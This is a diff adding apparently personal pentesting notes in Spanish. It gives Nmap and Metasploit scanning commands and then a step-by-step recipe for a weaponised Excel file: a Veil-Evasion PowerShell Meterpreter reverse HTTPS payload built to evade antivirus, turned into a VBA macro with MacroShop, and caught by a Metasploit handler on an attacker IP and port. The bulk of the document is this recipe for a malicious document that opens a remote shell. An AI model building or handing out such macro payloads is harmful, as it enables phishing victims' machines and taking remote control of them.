@@ -1,0 +1,54 @@
+Fecha: 5 de marzo
+
+Orden:
+
+- Veil Evasion
+- MacroShop
+------------------------------------------------
+                    Pentesting 
+
+Nmap: nmap -Pn ip
+
+Metasploit:
+ use auxiliary/scanner/netbios/nbname
+ set rhosts ip
+ 
+
+
+
+
+
+
+
+----------------------------------------------
+1) Veil Evasion:
+
+ - cd Veil-Evasion
+ - ./Veil Evasion
+ - list
+ - use powershell/meterpreter/rev_https.py 
+ - set lport <puertolibre>
+ - set lhost <ipAtacante>
+ - generate
+ - copiar el archivo .bat
+
+2) MacroShop:
+
+ - cd MacroShop
+ - ./macro_safe.py <ruta archivo .bat> <ruta archivo de salida> 
+ 
+3) Excel:
+    
+ - ALT+f11 (Abrir programación de las macros)
+ - Copiar el contenido del archivo creado en el paso anterior 
+ - Guardar la macro
+ - Guardar el archivo de excel con macro activadas
+
+ 4) Metasploit:
+  - use exploit/multi/handler
+  - set payload windows/meterpreter/reverse_https
+  - set lport <mismo puerto del bat>
+  - set lhost <ip atacante>
+  - run
+
+
